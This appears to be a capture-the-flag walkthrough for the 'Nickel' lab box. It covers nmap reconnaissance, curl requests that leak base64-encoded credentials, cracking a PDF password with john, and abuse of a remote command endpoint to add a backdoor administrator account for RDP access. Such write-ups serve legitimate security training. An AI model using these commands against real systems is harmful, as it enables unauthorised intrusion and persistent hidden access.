---
icon: windows
---

# Nickel - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
Nmap scan report for 192.168.174.99
Host is up (0.029s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-29T15:44:31+00:00; +2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2025-09-29T15:43:24+00:00
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-09-28T12:56:33
|_Not valid after:  2026-03-30T12:56:33
5040/tcp  open  unknown
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/29%OT=21%CT=1%CU=31523%PV=Y%DS=4%DC=T%G=Y%TM=68DAA95
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=1
OS:03%GCD=1%ISR=108%TI=I%CI=I%TS=U)SEQ(SP=106%GCD=1%ISR=107%TI=I%CI=I%TS=U)
OS:SEQ(SP=FA%GCD=1%ISR=10D%TI=I%CI=I%TS=U)SEQ(SP=FB%GCD=1%ISR=108%TI=I%CI=I
OS:%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O3=M578NW8%O4=M578NW8NNS%O5=M578NW
OS:8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-29T15:43:28
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   31.22 ms 192.168.45.1
2   31.16 ms 192.168.45.254
3   26.58 ms 192.168.251.1
4   27.16 ms 192.168.174.99
```

### <mark style="color:$primary;">HTTP Port 80  TCP</mark>

<figure><img src="../../.gitbook/assets/image (2182).png" alt=""><figcaption></figcaption></figure>

Directory busting does not give us much about this endpoint, so I will move on to port 8089.

### <mark style="color:$primary;">HTTP Port 8089 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2164).png" alt=""><figcaption></figcaption></figure>

All of the buttons lead to the same error

<figure><img src="../../.gitbook/assets/image (2165).png" alt=""><figcaption></figcaption></figure>

If we look at the IP address it tries to connect to, it's an APIPA address, which means DHCP isn't working, so the web server gave itself a default address.

<figure><img src="../../.gitbook/assets/image (2166).png" alt=""><figcaption></figcaption></figure>

It’s calling endpoints on the other webserver at port 33333, it's probably using a hard coded APIPA address, I doubt its being populated by a broken DHCP service. Its most likely using the actual IP or localhost \[127.0.0.1] instead. With this in mind I am going to checkout port 33333 now.

### <mark style="color:$primary;">HTTP Port 33333 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2167).png" alt=""><figcaption></figcaption></figure>

I tried to do directory busting, but nothing came up. However when I tried using curl with one of the endpoints discovered earlier, I got a hint!

<figure><img src="../../.gitbook/assets/image (2168).png" alt=""><figcaption></figcaption></figure>

200 OK, means the enpoint exists! However GET is not allowed on this endpoint let's try a POST request

<figure><img src="../../.gitbook/assets/image (2169).png" alt=""><figcaption></figcaption></figure>

We got a 411 Response code that means it requires <mark style="color:$info;">**content-length**</mark> header

```
curl -i http://192.168.174.99:33333/list-current-deployments -X POST -H 'Content-Length: 0'
```

<figure><img src="../../.gitbook/assets/image (2170).png" alt=""><figcaption></figcaption></figure>

And we reached a dead end, at least we figured out the what the endpoint requires. Let's check the other one!

```
curl -i http://192.168.174.99:33333/list-running-procs -X POST -H 'Content-Length: 0'
```

<figure><img src="../../.gitbook/assets/image (2171).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2172).png" alt=""><figcaption></figcaption></figure>

We struck gold, Credential disclosure! we found a user and a password

```
ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

I am also going to check the other endpoint before trying to ssh with these credentials

```
curl -i http://192.168.174.99:33333/list-active-nodes -X POST -H 'Content-Length: 0'
```

<figure><img src="../../.gitbook/assets/image (2173).png" alt=""><figcaption></figcaption></figure>

Nothing, better to check everything than miss on any important information! Before we try to SSH the password is base64 encoded, I am going to decode it

```
echo 'Tm93aXNlU2xvb3BUaGVvcnkxMzkK' | base64 -d
```

<figure><img src="../../.gitbook/assets/image (2174).png" alt=""><figcaption></figcaption></figure>

```
ariah:NowiseSloopTheory139
```

### <mark style="color:$primary;">SSH as ariah</mark>

<figure><img src="../../.gitbook/assets/image (2175).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2176).png" alt=""><figcaption></figcaption></figure>

Discovered an interesting file in the ftp share during manual enumeration. I am going to ftp in, download it to my machine and check it out.

<figure><img src="../../.gitbook/assets/image (2177).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2178).png" alt=""><figcaption></figcaption></figure>

The pdf is password protected, I am going try cracking it using john. Run the following commands to get and crack the hash!

### <mark style="color:$primary;">Cracking pdf password</mark>

```
pdf2john Infrastructure.pdf > pdf.hash
```

```
john pdf.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2179).png" alt=""><figcaption></figcaption></figure>

Now that we have the password let's check out what this pdf is hiding.

<figure><img src="../../.gitbook/assets/image (2180).png" alt=""><figcaption></figcaption></figure>

This looks like a list of additional endpoints, the http://nickel/? endpoint is the machine we are currently on.

<figure><img src="../../.gitbook/assets/image (2181).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2184).png" alt=""><figcaption></figcaption></figure>

This reminds me of port 80! The Infrastructure.pdf states that we can run commands on this endpoint

<figure><img src="../../.gitbook/assets/image (2185).png" alt=""><figcaption></figcaption></figure>

After a few guesses I got it! It works from the outside as well!

<figure><img src="../../.gitbook/assets/image (2186).png" alt=""><figcaption></figcaption></figure>

I could have the machine download nc64 and make it return a reverse shell. But rdp is available, so I am going to create a new user and give him admin rights and add him to the Remote Desktop Users group, so he can rdp! I'll be running the following commands:

### <mark style="color:$primary;">Creating new Admin user</mark>

```
net user deimos Password123! /add
net localgroup administrators deimos /add
net localgroup 'Remote Desktop Users' deimos /add
```

Url encoded commands:

```
net%20user%20deimos%20Password123!%20/add
net%20localgroup%20administrators%20deimos%20/add
net%20localgroup%20'Remote%20Desktop%20Users'%20deimos%20/add
```

<figure><img src="../../.gitbook/assets/image (2187).png" alt=""><figcaption></figcaption></figure>

Now we should be able to rdp onto the machine!

### <mark style="color:$primary;">RDP as admin user</mark>

```
xfreerdp3 /u:deimos /p:'Password123!' /v:192.168.174.99 /clipboard /dynamic-resolution /cert:ignore
```

<figure><img src="../../.gitbook/assets/image (2188).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2189).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**Make sure to run command prompt as administrator!**</mark>

We are admin!
